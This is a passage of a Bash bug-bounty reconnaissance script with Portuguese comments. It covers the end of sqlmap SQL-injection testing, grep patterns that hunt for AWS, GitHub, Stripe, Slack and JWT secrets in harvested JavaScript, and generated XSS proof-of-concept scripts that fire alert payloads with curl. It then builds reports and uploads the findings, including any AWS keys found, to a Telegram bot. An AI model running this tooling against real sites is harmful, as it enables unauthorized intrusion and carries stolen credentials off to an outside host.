          log_info "[!] ‚úÖ VULNERABILIDADE CONFIRMADA: $url"
        else
          echo "[$(date)] SAFE: $url" >> nuclei/sqlmap_checked.txt
        fi
        
        # Log completo sempre salvo
        echo "=== $url ===" >> nuclei/sqlmap_checked.txt
        cat "$log_file" >> nuclei/sqlmap_checked.txt 2>/dev/null || true
        echo "" >> nuclei/sqlmap_checked.txt
        
      done < urls/sqli_sample.txt
      
      # FASE 3: Relat√≥rio final COM STATUS
      VULNERABILITIES_FOUND=$(safe_count urls/sqli_validated.txt)
      
      send_telegram_progress "SQLi Complete" 3 3 "an√°lise finalizada"
      
      if [ "$VULNERABILITIES_FOUND" -gt 0 ]; then
        echo ""
        echo "üî• CRITICAL: $VULNERABILITIES_FOUND SQLi vulnerabilities confirmed!"
        echo "üìÅ Detalhes: urls/sqli_validated.txt"
        echo "üìÅ Exploits: poc/sqli/"
        echo "üìÅ Logs: logs/sqlmap/"
        
        send_telegram_status "üö® *CRITICAL SQL INJECTION*
üí• $VULNERABILITIES_FOUND vulnerabilidades confirmadas!
üìÅ PoCs gerados em poc/sqli/
‚ö†Ô∏è REVIS√ÉO MANUAL URGENTE!" true
        
        # Criar resumo de vulnerabilidades
        cat > poc/sqli/VULNERABILITIES_SUMMARY.txt <<-VULNSUMMARY
SQLi VULNERABILITIES FOUND - $(date)
=====================================

CONFIRMED VULNERABILITIES: $VULNERABILITIES_FOUND

URLs AFFECTED:
$(cat urls/sqli_validated.txt 2>/dev/null)

EXPLOITATION:
- Individual exploits: poc/sqli/exploit_*.sh
- Batch commands: poc/sqli/sqlmap_results.txt
- Detailed logs: logs/sqlmap/

NEXT STEPS:
1. Manual verification recommended
2. Check for sensitive data exposure  
3. Test privilege escalation
4. Document for responsible disclosure

IMPACT: HIGH - Direct database access possible
VULNSUMMARY

      else
        echo "‚úÖ Nenhuma vulnerabilidade SQLi confirmada na amostra testada"
        echo "üìù $SAMPLE_SIZE URLs testados de $TOTAL_CANDIDATES candidatos"
        
        send_telegram_status "‚úÖ *SQLi TESTING COMPLETE*
üß™ $SAMPLE_SIZE URLs testadas
üõ°Ô∏è Nenhuma vulnerabilidade confirmada"
      fi
      
    else
      log_info "Nenhum candidato SQLi encontrado"
      touch urls/sqli_candidates.txt urls/sqli_validated.txt
    fi
  else
    log_info "Nenhum candidato SQLi encontrado"
    touch urls/sqli_candidates.txt urls/sqli_validated.txt
  fi
else
  log_error "sqlmap ou gf n√£o dispon√≠vel"
  touch urls/sqli_candidates.txt urls/sqli_validated.txt
fi

# ============= SECRETS HUNTING COM VERIFICA√á√ÉO E STATUS =============
echo "\n========== ENHANCED SECRETS HUNTING =========="
send_telegram_status "üîë *SECRETS HUNTING*
Analisando $JS_DOWNLOADED arquivos JS para secrets..."

mkdir -p secrets

# VERIFICAR se temos arquivos JS baixados
if [ -d js/downloads ] && [ "$(ls -A js/downloads 2>/dev/null)" ]; then
  log_info "Scanning JavaScript files for secrets..."
  
  # AWS Keys
  grep -IrohE "AKIA[0-9A-Z]{16}" js/downloads/* 2>/dev/null | sort -u > secrets/aws_keys.txt || true
  
  # Google API Keys  
  grep -IrohE "AIza[0-9A-Za-z\\-_]{35}" js/downloads/* 2>/dev/null | sort -u > secrets/google_api_keys.txt || true
  
  # Firebase Keys
  grep -IrohE "firebase[_-]?api[_-]?key[\"']?\s*[:=]\s*[\"'][A-Za-z0-9\-_.]{20,}[\"']" js/downloads/* 2>/dev/null | sort -u > secrets/firebase_keys.txt || true
  
  # JWT Tokens
  grep -IrohE "eyJ[0-9A-Za-z\-_]{30,}\.[0-9A-Za-z\-_]{30,}\.[0-9A-Za-z\-_]{20,}" js/downloads/* 2>/dev/null | sort -u > secrets/jwt_tokens.txt || true
  
  # Slack Tokens
  grep -IrohE "xox[baprs]-[0-9a-zA-Z\\-]+" js/downloads/* 2>/dev/null | sort -u > secrets/slack_tokens.txt || true
  
  # Stripe Keys
  grep -IrohE "sk_live_[0-9a-zA-Z]{24}" js/downloads/* 2>/dev/null | sort -u > secrets/stripe_keys.txt || true
  grep -IrohE "pk_live_[0-9a-zA-Z]{24}" js/downloads/* 2>/dev/null | sort -u > secrets/stripe_public_keys.txt || true
  
  # GitHub Tokens  
  grep -IrohE "ghp_[0-9A-Za-z]{36}" js/downloads/* 2>/dev/null | sort -u > secrets/github_tokens.txt || true
  
  # Heroku API Keys
  grep -IrohE "[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}" js/downloads/* 2>/dev/null | sort -u > secrets/heroku_keys.txt || true
  
  # Generic API Keys
  grep -IrohE "(api[_-]?key|apikey|access[_-]?token)[\"']?\s*[:=]\s*[\"'][A-Za-z0-9\-_.]{16,}[\"']" js/downloads/* 2>/dev/null | sort -u > secrets/generic_api_keys.txt || true
  
  # Contar secrets encontrados
  AWS_SECRETS=$(safe_count secrets/aws_keys.txt)
  GOOGLE_SECRETS=$(safe_count secrets/google_api_keys.txt)
  JWT_SECRETS=$(safe_count secrets/jwt_tokens.txt)
  GITHUB_SECRETS=$(safe_count secrets/github_tokens.txt)
  STRIPE_SECRETS=$(safe_count secrets/stripe_keys.txt)
  
  TOTAL_SECRETS=$((AWS_SECRETS + GOOGLE_SECRETS + JWT_SECRETS + GITHUB_SECRETS + STRIPE_SECRETS))
  
  if [ "$TOTAL_SECRETS" -gt 0 ]; then
    send_telegram_alert "SECRETS EXPOSED" "$TOTAL_SECRETS secrets found: AWS($AWS_SECRETS), Google($GOOGLE_SECRETS), JWT($JWT_SECRETS), GitHub($GITHUB_SECRETS), Stripe($STRIPE_SECRETS)"
  fi
else
  log_info "Nenhum arquivo JS encontrado para an√°lise de secrets"
  # Criar arquivos vazios
  touch secrets/aws_keys.txt secrets/google_api_keys.txt secrets/jwt_tokens.txt
  TOTAL_SECRETS=0
fi

send_telegram_status "‚úÖ *SECRETS SCAN COMPLETE*
üîç $TOTAL_SECRETS secrets encontrados
üéØ Tipos: AWS, Google, JWT, GitHub, Stripe"

# ============= ENDPOINTS E APIS COM VERIFICA√á√ÉO =============
echo "\n========== EXTRA√á√ÉO DE ENDPOINTS E APIS =========="
mkdir -p endpoints apis

# Endpoints de JS - COM VERIFICA√á√ÉO
if [ -s js/js_urls_raw.txt ] && [ -d js/downloads ] && [ "$(ls -A js/downloads 2>/dev/null)" ]; then
  log_info "Extraindo endpoints de arquivos JS..."
  grep -rhoE "https?://[a-zA-Z0-9./?=_-]+" js/downloads/* 2>/dev/null | sort -u > endpoints/js_endpoints.txt || true
else
  touch endpoints/js_endpoints.txt
fi

# APIs - COM VERIFICA√á√ÉO
if [ -s urls/all_urls_raw.txt ]; then
  grep -Ei "/api/|/graphql|/v1/|/v2/|\.json|\.asmx" urls/all_urls_raw.txt > apis/api_endpoints.txt 2>/dev/null || true
else
  touch apis/api_endpoints.txt
fi

API_ENDPOINTS=$(safe_count apis/api_endpoints.txt)
JS_ENDPOINTS=$(safe_count endpoints/js_endpoints.txt)

echo "\n========== PHASE 7: PARAM MINING & GF CLASSIFICATION =========="
send_telegram_status "üîç *GF CLASSIFICATION*
Classificando URLs por tipo de vulnerabilidade..."

# classify urls with gf (xss, sqli, lfi, ssrf, rce, etc.) - COM VERIFICA√á√ÉO
if command -v gf >/dev/null 2>&1 && [ -s urls/all_urls_raw.txt ]; then
  log_info "Running gf classification against all urls..."
  cat urls/all_urls_raw.txt | gf xss 2>/dev/null | sort -u > urls/gf_xss.txt || true
  cat urls/all_urls_raw.txt | gf sqli 2>/dev/null | sort -u > urls/gf_sqli.txt || true
  cat urls/all_urls_raw.txt | gf lfi 2>/dev/null | sort -u > urls/gf_lfi.txt || true
  cat urls/all_urls_raw.txt | gf ssrf 2>/dev/null | sort -u > urls/gf_ssrf.txt || true
else
  log_info "gf n√£o dispon√≠vel ou nenhuma URL para classificar"
  touch urls/gf_xss.txt urls/gf_sqli.txt urls/gf_lfi.txt urls/gf_ssrf.txt
fi

XSS_CANDIDATES=$(safe_count urls/gf_xss.txt)
SQLI_CANDIDATES=$(safe_count urls/gf_sqli.txt)
LFI_CANDIDATES=$(safe_count urls/gf_lfi.txt)
SSRF_CANDIDATES=$(safe_count urls/gf_ssrf.txt)

send_telegram_status "‚úÖ *GF CLASSIFICATION COMPLETE*
‚ùå XSS: $XSS_CANDIDATES
üíâ SQLi: $SQLI_CANDIDATES  
üìÅ LFI: $LFI_CANDIDATES
üåê SSRF: $SSRF_CANDIDATES"

# ============= POC GENERATION COM VERIFICA√á√ïES E STATUS =============
echo "\n========== ENHANCED POC GENERATION =========="
send_telegram_status "üìù *GENERATING POCS*
Criando Proof of Concepts para vulnerabilidades..."

mkdir -p poc/xss poc/sqli poc/notes

# Create README.md in poc/notes - COM VERIFICA√á√ÉO
if [ -s urls/gf_xss.txt ] || [ -s urls/gf_sqli.txt ] || [ -s urls/sqli_validated.txt ]; then
  cat > poc/notes/README.md <<-EOF
# Proof of Concepts Summary

Generated: $(date -u)

## XSS PoCs
- Location: poc/xss/
- Count: $(ls poc/xss/*.sh 2>/dev/null | wc -l)
- Based on gf patterns and parameter analysis

## SQLi PoCs  
- Location: poc/sqli/
- Count: $(ls poc/sqli/*.sh 2>/dev/null | wc -l)
- Includes sqlmap commands for validated endpoints

## Notes
- All PoCs are non-destructive and use safe payloads
- Manually verify before reporting
- Follow responsible disclosure practices
EOF
fi

# Enhanced XSS PoC generation - COM VERIFICA√á√ÉO
XSS_POCS_GENERATED=0
if [ -s urls/gf_xss.txt ]; then
  log_info "Generating XSS PoCs..."
  while read -r url; do
    if [ -n "$url" ]; then
      hash=$(echo "$url" | md5sum | cut -c1-8)
      poc_file="poc/xss/poc_${hash}.sh"
      
      cat > "$poc_file" <<-POCEOF
#!/bin/bash
# XSS PoC for: $url
echo "Testing XSS on: $url"

# Basic payload
curl -s -G --data-urlencode "payload=<script>alert('XSS')</script>" "$url"

# DOM payload  
curl -s -G --data-urlencode "payload=<img src=x onerror=alert('XSS')>" "$url"

# Reflected payload
curl -s -G --data-urlencode "payload=\"><script>alert(document.domain)</script>" "$url"
POCEOF
      chmod +x "$poc_file"
      XSS_POCS_GENERATED=$((XSS_POCS_GENERATED + 1))
    fi
  done < urls/gf_xss.txt
else
  log_info "Nenhum candidato XSS encontrado para gerar PoCs"
fi

SQLI_POCS_GENERATED=$(ls poc/sqli/*.sh 2>/dev/null | wc -l || echo 0)

send_telegram_status "‚úÖ *POCS GENERATED*
‚ùå XSS PoCs: $XSS_POCS_GENERATED
üíâ SQLi PoCs: $SQLI_POCS_GENERATED
üìÅ Localiza√ß√£o: poc/"

# ============= ENHANCED REPORTING COM VERIFICA√á√ïES E STATUS =============
echo "\n========== ENHANCED REPORTING =========="
send_telegram_status "üìä *GENERATING REPORTS*
Compilando relat√≥rios finais..."

# Count vulnerabilities for summary
NUCLEI_FAST_TOTAL=$((NUCLEI_FAST_COUNT + NUCLEI_FAST_URLS))
NUCLEI_EXT_TOTAL=$((NUCLEI_EXT_COUNT + NUCLEI_EXT_URLS))
SQLMAP_FINDINGS=$(safe_count urls/sqli_validated.txt)

# Create vulnerability summary
cat > reports/vuln_summary.txt <<-VSUMMARY
VULNERABILITY SUMMARY - $(date -u)
=====================================

üî• CRITICAL FINDINGS:
- Confirmed SQLi: $SQLMAP_FINDINGS
- Nuclei Critical: $NUCLEI_FAST_TOTAL  
- Exposed Secrets: $TOTAL_SECRETS

‚ö° POTENTIAL ISSUES:
- XSS Candidates: $XSS_CANDIDATES
- SQLi Candidates: $SQLI_CANDIDATES
- Nuclei Medium: $NUCLEI_EXT_TOTAL

üìä ATTACK SURFACE:
- Live Hosts: $LIVE_HOSTS
- URLs with Params: $PARAM_URLS
- API Endpoints: $API_ENDPOINTS

PRIORITY: $([ "$SQLMAP_FINDINGS" -gt 0 ] && echo "üî¥ HIGH" || [ "$NUCLEI_FAST_TOTAL" -gt 0 ] && echo "üü° MEDIUM" || echo "üü¢ LOW")
VSUMMARY

# Enhanced report.md - COMPLETO
REPORT=reports/report.md

cat > "$REPORT" <<-EOT
# Bug Bounty Reconnaissance Report
Generated: $(date -u)  
Target Scope: $(basename "$SCOPE_FILE")

## üéØ Executive Summary
- **Attack Surface**: $LIVE_HOSTS live hosts, $PARAM_URLS parameterized URLs
- **Risk Level**: $([ "$SQLMAP_FINDINGS" -gt 0 ] && echo "üî¥ **HIGH**" || [ "$NUCLEI_FAST_TOTAL" -gt 0 ] && echo "üü° **MEDIUM**" || echo "üü¢ **LOW**")

## üî• Critical Vulnerabilities Confirmed

### SQL Injection  
- **Confirmed**: $SQLMAP_FINDINGS endpoints
- **Candidates**: $SQLI_CANDIDATES URLs  
- **Details**: See \`urls/sqli_validated.txt\` and \`poc/sqli/\`

### High-Risk Nuclei Findings
- **Fast Scan**: $NUCLEI_FAST_TOTAL critical findings
- **Details**: See \`nuclei/nuclei_hosts_fast.txt\` and \`nuclei/nuclei_urls_fast.txt\`

### Information Disclosure  
- **Secrets Found**: $TOTAL_SECRETS items
- **AWS Keys**: $(safe_count secrets/aws_keys.txt)
- **Google API**: $(safe_count secrets/google_api_keys.txt)
- **JWT Tokens**: $(safe_count secrets/jwt_tokens.txt)
- **GitHub Tokens**: $(safe_count secrets/github_tokens.txt)
- **Stripe Keys**: $(safe_count secrets/stripe_keys.txt)
- **Location**: \`secrets/\` directory

## ‚ö° Potential Vulnerabilities

### Cross-Site Scripting (XSS)
- **Candidates**: $XSS_CANDIDATES endpoints
- **PoCs Generated**: $XSS_POCS_GENERATED
- **Manual Testing**: Review \`urls/gf_xss.txt\`

### Other Vulnerabilities
- **LFI Candidates**: $LFI_CANDIDATES
- **SSRF Candidates**: $SSRF_CANDIDATES
- **Open Redirects**: $(safe_count nuclei/open_redirects.txt)

### Misconfigurations
- **Nuclei Extended**: $NUCLEI_EXT_TOTAL findings  
- **Details**: See \`nuclei/nuclei_hosts_ext.txt\` and \`nuclei/nuclei_urls_ext.txt\`

## üìä Attack Surface Analysis

### Reconnaissance Results
- **Subdomains Discovered**: $SUBS_FOUND
- **Live Hosts**: $LIVE_HOSTS  
- **Total URLs**: $TOTAL_URLS
- **Parameterized URLs**: $PARAM_URLS
- **JavaScript Files**: $JS_FILES ($(find js/downloads -type f 2>/dev/null | wc -l) downloaded)

### API Surface  
- **API Endpoints**: $API_ENDPOINTS
- **JS Endpoints**: $JS_ENDPOINTS

### Port Scanning
- **Open Ports**: $PORTS_FOUND
- **Hosts with Ports**: $HOSTS_WITH_PORTS

### Technology Stack
- **Details**: See \`alive/httpx_parsed.txt\` for full tech stack information

## üìÅ Important Files
- **Live Hosts**: \`alive/httpx_results.txt\`
- **Parameterized URLs**: \`urls/with_params.txt\` 
- **Nuclei Results**: \`nuclei/nuclei_*_fast.txt\` (critical), \`nuclei/nuclei_*_ext.txt\` (extended)
- **SQLi Validation**: \`urls/sqli_validated.txt\`
- **Secrets**: \`secrets/\` directory
- **PoCs**: \`poc/\` directory  
- **API Endpoints**: \`apis/api_endpoints.txt\`

## üöÄ Next Steps
1. **Immediate**: Manually validate SQLi findings in \`urls/sqli_validated.txt\`
2. **High Priority**: Test XSS candidates with payloads from \`poc/xss/\`
3. **Medium Priority**: Review secrets in \`secrets/\` for sensitive exposure
4. **Ongoing**: Monitor nuclei findings and validate misconfigurations

## ‚ö†Ô∏è Methodology Notes
- SQLi testing limited to level=1, risk=1 (safe parameters)
- All PoCs use non-destructive payloads  
- Manual verification required before reporting
- Scope limited to authorized targets only

---
**Report generated by automated reconnaissance pipeline with Telegram status updates**
EOT

# Create a small HTML dashboard
HTML=html/dashboard.html
cat > "$HTML" <<-HTMLDOC
<!doctype html>
<html>
<head>
  <meta charset="utf-8">
  <title>Recon Dashboard</title>
  <style>
    body{font-family:Inter,Arial,Helvetica,sans-serif;padding:20px;background:#f5f5f5}
    .container{max-width:1200px;margin:0 auto;background:white;padding:30px;border-radius:10px;box-shadow:0 4px 6px rgba(0,0,0,0.1)}
    .metric{display:inline-block;margin:10px;padding:15px;background:#f8f9fa;border-radius:8px;min-width:120px;text-align:center}
    .metric-value{font-size:24px;font-weight:bold;color:#2563eb}
    .metric-label{font-size:12px;color:#6b7280;margin-top:5px}
    .critical{background:#fef2f2;border-left:4px solid #ef4444}
    .warning{background:#fefce8;border-left:4px solid #f59e0b}
    .success{background:#f0fdf4;border-left:4px solid #10b981}
    pre{background:#f4f4f4;padding:12px;border-radius:6px;overflow-x:auto}
    h1{color:#1f2937;margin-bottom:10px}
    h2{color:#374151;margin-top:30px;margin-bottom:15px}
  </style>
</head>
<body>
  <div class="container">
    <h1>üéØ Bug Bounty Reconnaissance Dashboard</h1>
    <p><strong>Generated:</strong> $(date -u) | <strong>Target:</strong> $(basename "$SCOPE_FILE")</p>
    
    <h2>üìä Attack Surface</h2>
    <div class="metric">
      <div class="metric-value">$SUBS_FOUND</div>
      <div class="metric-label">Subdomains</div>
    </div>
    <div class="metric">
      <div class="metric-value">$LIVE_HOSTS</div>
      <div class="metric-label">Live Hosts</div>
    </div>
    <div class="metric">
      <div class="metric-value">$TOTAL_URLS</div>
      <div class="metric-label">URLs Found</div>
    </div>
    <div class="metric">
      <div class="metric-value">$PARAM_URLS</div>
      <div class="metric-label">With Parameters</div>
    </div>
    
    <h2>üî• Critical Findings</h2>
    <div class="metric critical">
      <div class="metric-value">$SQLMAP_FINDINGS</div>
      <div class="metric-label">Confirmed SQLi</div>
    </div>
    <div class="metric critical">
      <div class="metric-value">$NUCLEI_FAST_TOTAL</div>
      <div class="metric-label">Nuclei Critical</div>
    </div>
    <div class="metric warning">
      <div class="metric-value">$TOTAL_SECRETS</div>
      <div class="metric-label">Secrets Exposed</div>
    </div>
    
    <h2>‚ö° Potential Issues</h2>
    <div class="metric warning">
      <div class="metric-value">$XSS_CANDIDATES</div>
      <div class="metric-label">XSS Candidates</div>
    </div>
    <div class="metric warning">
      <div class="metric-value">$NUCLEI_EXT_TOTAL</div>
      <div class="metric-label">Medium Risk</div>
    </div>
    <div class="metric">
      <div class="metric-value">$API_ENDPOINTS</div>
      <div class="metric-label">API Endpoints</div>
    </div>
    
    <h2>üîç Latest Findings</h2>
    <pre>$(head -n 50 nuclei/nuclei_*_fast.txt nuclei/dalfox_results.txt 2>/dev/null || echo "No critical findings")</pre>
    
    <h2>üîó Quick Links</h2>
    <ul>
      <li><a href="../reports/report.md">üìã Full Report</a></li>
      <li><a href="../reports/vuln_summary.txt">‚ö° Quick Summary</a></li>
      <li><a href="../urls/sqli_validated.txt">üíâ SQLi Results</a></li>
      <li><a href="../poc/">üìù PoCs Directory</a></li>
      <li><a href="../secrets/">üîë Secrets Directory</a></li>
    </ul>
  </div>
</body>
</html>
HTMLDOC

# ============= ENHANCED TELEGRAM REPORTING WITH INSTANCE SUPPORT =============
### Final Telegram Report ###
if [ -n "$TELEGRAM_BOT_TOKEN" ] && [ -n "$TELEGRAM_CHAT_ID" ]; then
  log_info "Enviando relat√≥rio final para Telegram..."

  # Determine alert level
  if [ "$SQLMAP_FINDINGS" -gt 0 ] || [ "$NUCLEI_FAST_TOTAL" -gt 5 ]; then
    ALERT="üî¥ *HIGH RISK*"
  elif [ "$XSS_CANDIDATES" -gt 10 ] || [ "$NUCLEI_FAST_TOTAL" -gt 0 ]; then
    ALERT="üü° *MEDIUM RISK*"  
  else
    ALERT="üü¢ *LOW RISK*"
  fi

  FINAL_SUMMARY="$ALERT  
üéØ *Bug Bounty Scan COMPLETE* ‚úÖ
üìÇ \`$(pwd | sed 's/.*\///')\`  
‚è±Ô∏è Finalizado: \`$(date '+%H:%M:%S')\`

*üìä Attack Surface:*  
- üåê Subdomains: $SUBS_FOUND  
- üü¢ Live hosts: $LIVE_HOSTS  
- üîó URLs: $TOTAL_URLS ($PARAM_URLS com par√¢metros)  
- üö™ Portas: $PORTS_FOUND abertas

*üî• Critical Findings:*  
- üíâ SQLi confirmada: $SQLMAP_FINDINGS  
- ‚ö° Nuclei cr√≠tico: $NUCLEI_FAST_TOTAL  
- üîë Secrets expostos: $TOTAL_SECRETS  

*‚ö° Potential Issues:*  
- ‚ùå XSS candidatos: $XSS_CANDIDATES  
- üîç M√©dio risco: $NUCLEI_EXT_TOTAL
- üìÅ LFI candidatos: $LFI_CANDIDATES
- üåê SSRF candidatos: $SSRF_CANDIDATES

*üìù PoCs Generated:*
- ‚ùå XSS: $XSS_POCS_GENERATED scripts
- üíâ SQLi: $SQLI_POCS_GENERATED exploits

*üéØ Next Steps:*
- Manual validation required
- Check poc/ directory for exploits
- Review secrets/ for sensitive data
"

  # Send final summary with enhanced function
  send_telegram_message_enhanced "$FINAL_SUMMARY" "false"

  # Enhanced send files function with retry logic
  send_file_to_telegram() {
    local file="$1"
    local description="$2"
    local max_retries=3
    local retry_count=0
    
    if [ -f "$file" ] && [ -s "$file" ]; then
      log_info "Enviando $description para Telegram..."
      
      while [ "$retry_count" -lt "$max_retries" ]; do
        # Apply rate limiting for file uploads
        telegram_rate_limit
        
        if curl -s -m 90 -F chat_id="${TELEGRAM_CHAT_ID}" -F document=@"$file" \
             "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument" >/dev/null 2>&1; then
          return 0
        fi
        
        retry_count=$((retry_count + 1))
        log_error "Falha ao enviar $description (tentativa $retry_count/$max_retries)"
        
        # Exponential backoff
        local backoff=$(( (2 ** retry_count) + (RANDOM % 5) ))
        sleep "$backoff"
      done
      
      log_error "Falha ao enviar $description ap√≥s $max_retries tentativas"
    fi
  }

  # Send main files with enhanced retry logic
  send_file_to_telegram "reports/report.md" "Relat√≥rio completo"
  send_file_to_telegram "html/dashboard.html" "Dashboard HTML"
  send_file_to_telegram "reports/vuln_summary.txt" "Resumo de vulnerabilidades"
  
  # Send critical findings if they exist
  [ "$SQLMAP_FINDINGS" -gt 0 ] && send_file_to_telegram "urls/sqli_validated.txt" "SQLi confirmadas"
  [ "$NUCLEI_FAST_TOTAL" -gt 0 ] && send_file_to_telegram "nuclei/nuclei_urls_fast.txt" "Nuclei cr√≠ticos"
  [ "$TOTAL_SECRETS" -gt 0 ] && send_file_to_telegram "secrets/aws_keys.txt" "AWS keys encontradas"

else
  log_info "Telegram n√£o configurado"
fi

# ============= COLORED TERMINAL OUTPUT FINAL =============
